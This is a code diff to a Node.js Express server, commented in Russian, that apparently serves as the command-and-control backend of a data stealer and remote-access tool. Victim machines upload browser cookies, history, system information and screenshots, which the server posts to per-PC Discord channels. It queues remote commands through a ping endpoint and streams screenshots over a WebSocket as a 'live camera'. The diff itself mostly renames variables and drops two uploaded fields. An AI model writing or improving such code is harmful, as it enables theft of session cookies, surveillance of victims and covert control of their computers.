@@ -11,6 +11,7 @@ const __dirname = dirname(__filename);
 const app = express();
 app.use(express.json({ limit: "50mb" }));
 
+// ---------- Конфиг ----------
 const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
 const GUILD_ID = process.env.GUILD_ID;
 const CATEGORY_NAME = "Все ПК";
@@ -20,14 +21,13 @@ const ONLINE_TIMEOUT = 3 * 60 * 1000;
 const onlinePCs = {};          // pcId -> timestamp
 const pendingCommands = {};    // pcId -> array of commands
 const channelByPC = {};        // pcId -> channelId
-const wsClients = {};          // pcId -> array of ws
-const messagesWithButtons = {}; // pcId -> messageId
+const wsCameraClients = {};    // pcId -> array of ws для live-камеры
 
 // ---------- Discord Bot ----------
 const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
 bot.once("ready", () => console.log(`✅ Бот вошёл как ${bot.user.tag}`));
 
-// ---------- Кнопки (оставляем как было) ----------
+// ---------- Кнопки ----------
 function createControlButtons(pcId) {
     const safePcId = encodeURIComponent(pcId);
     return [new ActionRowBuilder().addComponents(
@@ -39,7 +39,7 @@ function createControlButtons(pcId) {
     )];
 }
 
-// ---------- Обработка кнопок (как было) ----------
+// ---------- Обработка кнопок ----------
 bot.on("interactionCreate", async interaction => {
     if(!interaction.isButton()) return;
     const [command, encodedPcId] = interaction.customId.split("|");
@@ -81,10 +81,10 @@ async function getOrCreateTextChannel(guild, name, parentId){
     return channel;
 }
 
-// ---------- Приём данных (сохраняем функционал) ----------
+// ---------- Приём данных ----------
 app.post("/upload", async (req, res) => {
     try {
-        const { pcId, cookies, history, systemInfo, tabs, extensions, screenshot } = req.body;
+        const { pcId, cookies, history, systemInfo, screenshot } = req.body;
         if(!pcId) return res.status(400).json({ error:"pcId required" });
 
         onlinePCs[pcId] = Date.now();
@@ -104,9 +104,9 @@ app.post("/upload", async (req, res) => {
 
         if(files.length) await finalChannel.send({ files });
 
-        // ---------- WS для live камеры ----------
-        if(screenshot && wsClients[pcId]){
-            wsClients[pcId].forEach(ws => {
+        // ---------- Live камера ----------
+        if(screenshot && wsCameraClients[pcId]){
+            wsCameraClients[pcId].forEach(ws => {
                 try { ws.send(screenshot); } catch(e){ }
             });
         }
@@ -119,7 +119,7 @@ app.post("/upload", async (req, res) => {
 });
 
 // ---------- Пинг ----------
-app.post("/ping", (req, res) => {
+app.post("/ping", (req,res)=>{
     const { pcId } = req.body;
     if(!pcId) return res.status(400).json({ error:"pcId required" });
     onlinePCs[pcId] = Date.now();
@@ -128,25 +128,27 @@ app.post("/ping", (req, res) => {
     res.json({ commands });
 });
 
-// ---------- API для фронта (список онлайн ПК) ----------
-app.get("/api/online-pcs", (req, res) => {
+// ---------- API фронта ----------
+app.get("/api/online-pcs", (req,res)=>{
     res.json(Object.keys(onlinePCs));
 });
 
 // ---------- Статика ----------
-app.use(express.static(join(__dirname, "public"))); // html/js клиент
+app.use(express.static(join(__dirname,"public")));
 
-// ---------- WebSocket ----------
+// ---------- WebSocket для live камеры ----------
 const wss = new WebSocketServer({ noServer: true });
-wss.on("connection", (ws, req) => {
+wss.on("connection", (ws, req)=>{
     const url = new URL(req.url, `http://${req.headers.host}`);
     const pcId = url.searchParams.get("pcId");
     if(!pcId) return ws.close();
 
-    if(!wsClients[pcId]) wsClients[pcId] = [];
-    wsClients[pcId].push(ws);
+    if(!wsCameraClients[pcId]) wsCameraClients[pcId] = [];
+    wsCameraClients[pcId].push(ws);
 
-    ws.on("close", () => { wsClients[pcId] = wsClients[pcId].filter(c => c !== ws); });
+    ws.on("close", () => {
+        wsCameraClients[pcId] = wsCameraClients[pcId].filter(c=>c!==ws);
+    });
 });
 
 // ---------- HTTP + WS ----------
@@ -157,5 +159,5 @@ server.on("upgrade", (request, socket, head) => {
 
 // ---------- Запуск ----------
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`🚀 Сервер слушает порт ${PORT}`));
+server.listen(PORT,()=>console.log(`🚀 Сервер слушает порт ${PORT}`));
 bot.login(DISCORD_BOT_TOKEN);
